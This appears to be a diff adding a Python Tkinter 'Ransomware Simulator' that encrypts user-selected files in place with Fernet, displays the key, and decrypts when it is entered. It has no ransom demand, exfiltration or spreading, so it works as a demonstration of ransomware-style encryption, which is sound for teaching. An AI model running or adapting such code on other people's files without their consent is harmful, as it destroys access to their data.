@@ -1,0 +1,112 @@
+#Ransomware Simulator by Viajatech 
+
+#Eres responsable del uso de este script si deseas usarlo y de las consecuencias legales que puede conllevar.
+#Version Tkinter GUI [C] 
+
+#Por David Ruiz
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales @viajatech
+#Se agredecido y dale estrella a este repositorio, gracias! 
+
+#pip install cryptography tk
+
+
+import os
+import tkinter as tk
+from tkinter import filedialog, messagebox, simpledialog
+from cryptography.fernet import Fernet
+import base64
+
+class RansomwareSimulator:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Ransomware Simulator by Viaja Tech")
+        self.root.geometry("400x300")  # Establece el tamaño de la ventana
+        
+        self.key = Fernet.generate_key()
+        self.fernet = Fernet(self.key)
+        
+        self.files_to_encrypt = []
+
+        self.create_widgets()
+
+    def create_widgets(self):
+        self.select_button = tk.Button(self.root, text="Select Files/Directories", command=self.select_files, width=30, height=2)
+        self.select_button.pack(pady=10)
+
+        self.encrypt_button = tk.Button(self.root, text="Encrypt Files", command=self.encrypt_files, width=30, height=2)
+        self.encrypt_button.pack(pady=10)
+
+        self.decrypt_button = tk.Button(self.root, text="Decrypt Files", command=self.decrypt_files, width=30, height=2)
+        self.decrypt_button.pack(pady=10)
+
+        self.status_label = tk.Label(self.root, text="Status: Ready", font=("Helvetica", 12))
+        self.status_label.pack(pady=10)
+
+    def select_files(self):
+        files = filedialog.askopenfilenames()
+        self.files_to_encrypt.extend(files)
+        messagebox.showinfo("Files Selected", "Files and directories have been selected successfully.")
+
+    def encrypt_files(self):
+        for file_path in self.files_to_encrypt:
+            with open(file_path, 'rb') as file:
+                original_data = file.read()
+            encrypted_data = self.fernet.encrypt(original_data)
+            with open(file_path, 'wb') as file:
+                file.write(encrypted_data)
+        self.status_label.config(text="Status: Files Encrypted")
+        self.show_key_dialog(base64.urlsafe_b64encode(self.key).decode())
+
+    def show_key_dialog(self, key):
+        key_window = tk.Toplevel(self.root)
+        key_window.title("Encryption Key")
+        key_window.geometry("500x200")
+
+        tk.Label(key_window, text="Files have been encrypted. Decryption key:", font=("Helvetica", 12)).pack(pady=5)
+        key_text = tk.Text(key_window, wrap="word", height=5, width=50, font=("Helvetica", 12))
+        key_text.pack(pady=5)
+        key_text.insert("1.0", key)
+        key_text.config(state="disabled")
+
+        copy_button = tk.Button(key_window, text="Copy to Clipboard", command=lambda: self.copy_to_clipboard(key), width=20, height=2)
+        copy_button.pack(pady=5)
+
+    def copy_to_clipboard(self, text):
+        self.root.clipboard_clear()
+        self.root.clipboard_append(text)
+        messagebox.showinfo("Copied", "The decryption key has been copied to clipboard.")
+
+    def decrypt_files(self):
+        key_window = tk.Toplevel(self.root)
+        key_window.title("Enter Decryption Key")
+        key_window.geometry("500x200")
+
+        tk.Label(key_window, text="Enter the decryption key:", font=("Helvetica", 12)).pack(pady=10)
+        key_entry = tk.Entry(key_window, width=50, font=("Helvetica", 12))
+        key_entry.pack(pady=10)
+
+        def submit_key():
+            key_str = key_entry.get()
+            if key_str:
+                try:
+                    key = base64.urlsafe_b64decode(key_str)
+                    fernet = Fernet(key)
+                    for file_path in self.files_to_encrypt:
+                        with open(file_path, 'rb') as file:
+                            encrypted_data = file.read()
+                        decrypted_data = fernet.decrypt(encrypted_data)
+                        with open(file_path, 'wb') as file:
+                            file.write(decrypted_data)
+                    self.status_label.config(text="Status: Files Decrypted")
+                    messagebox.showinfo("Decryption Complete", "Files have been decrypted successfully.")
+                    key_window.destroy()
+                except Exception as e:
+                    messagebox.showerror("Error", f"Failed to decrypt files: {str(e)}")
+
+        submit_button = tk.Button(key_window, text="Submit", command=submit_key, width=20, height=2)
+        submit_button.pack(pady=10)
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = RansomwareSimulator(root)
+    root.mainloop()
